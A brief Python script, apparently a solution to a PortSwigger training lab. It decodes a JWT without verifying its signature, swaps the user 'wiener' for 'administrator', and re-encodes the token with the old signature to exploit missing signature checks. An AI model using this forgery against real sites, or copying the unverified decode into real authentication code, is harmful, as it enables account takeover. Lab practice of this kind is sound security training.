import jwt
import base64


# paste your token here

token = 'eyJraWQiOiIwZDlkYmJiMC01OWNkLTQxYzUtOTNmMi04M2MyYTAzNDljYmMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4NjY3ODMwNn0.dRWiKFHo1KzVp4rCs5oDXlWV5AT1CvJZ7MW4wxcxWFgN2lGv__DBEhW4kgHUHvnMK7P4Zpf6iUAx35q9VzwfgkKu8r5-FSy7QO18J6CrzyQIQMwESV3LTqXcsONsTT6HZlhgq9VtvvqH5PcZsYX-7Hc1zRh7bfFxlNacaLPCF8a3x99aZletGsHvQvZcMbsDaHqnoOudFnzH7DWNr6A2FoEfjaluHVcfFiuKopbkaRtv2yvI_snlM5-UNcJ6OIVxzbRFW0sfLCmGzgTKyW7oQhhfpByf4km5tDJ-L6904y-sUQNQEaGCZWO_IZdQVcvquSswPDJQ15cXq-6tpmHIDg'

#decode the token(without verifying)
payload = jwt.decode(token,options={"verify_signature": False})
print(f"Decode token: {payload}\n")

# Modify the token (JWT manipululation)
header , payload, signature = token.split('.')
decode_payload = base64.urlsafe_b64decode(payload+ '=' * (-len(payload) % 4))
modified_payload = decode_payload.replace(b'wiener',b'administrator')
print(f"Modified payload : {modified_payload.decode()}\n")


#Generate a new token with the modified payload(re-encoded)
modified_payload_b64 = base64.urlsafe_b64encode(modified_payload).rstrip(b'=').decode()
modified_token = f"{header}.{modified_payload_b64}.{signature}"
print(f"Modified token: {modified_token}\n")